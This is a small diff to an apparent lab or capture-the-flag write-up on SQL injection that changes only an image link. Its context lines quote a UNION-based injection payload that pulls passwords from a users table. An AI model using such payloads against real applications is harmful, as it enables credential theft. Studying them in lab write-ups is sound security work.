@@ -11,5 +11,5 @@ This one is also straightforward. It's just a basic UNION query. The correct pay
 admin' UNION SELECT password,null from users-- -
 ```
 
-![](attachments/2-first-exfiltration/file-20251121133547581.png)
+![](attachments/2-first-exfiltration/file-20251124113610765.png)
 
